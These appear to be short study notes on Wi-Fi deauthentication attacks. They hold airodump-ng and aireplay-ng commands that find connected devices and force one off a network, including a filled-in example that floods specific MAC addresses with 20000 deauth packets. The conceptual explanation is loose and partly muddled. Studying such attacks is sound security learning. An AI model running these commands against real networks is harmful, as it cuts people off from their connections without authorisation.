Deauthentication attacks 
 
- We can use this to disconnect any device from any network. No key needed 
- We are going to change our MAC address to the target's MAC address so the AP thinks that we are them 
- Then we will tell the router that we want to disconnect 
- It then disconnects your target's device 
- We then pretend to be the AP and tell the device they need to reauthenticate 
 
# Find out which devices are connected to the network
airodump-ng --channel <#> --bssid <MAC ADDRESS> mon0
 
# Disconnect target from AP
aireplay-ng --deauth <# of deauth packets> -a <AP MAC address> -c <target device MAC> mon0
aireplay-ng --deauth 20000 -a F0:7B:CB:5D:75:C2 -c C0:BD:D1:24:A4:E8 mon0
